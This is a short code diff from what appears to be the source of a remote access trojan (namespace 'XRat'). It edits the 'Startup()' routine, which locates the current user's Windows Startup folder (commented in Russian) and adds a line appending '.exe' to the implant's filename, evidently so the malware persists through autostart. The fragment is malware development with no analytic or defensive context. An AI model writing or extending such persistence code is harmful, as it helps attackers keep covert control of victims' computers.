@@ -174,6 +174,8 @@ namespace XRat
 
         public static string Startup()
         {
+            Settings.filename = Settings.filename + ".exe";
+
             // Получаем путь к папке автозагрузки текущего пользователя
             string userStartupFolder = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.Startup)
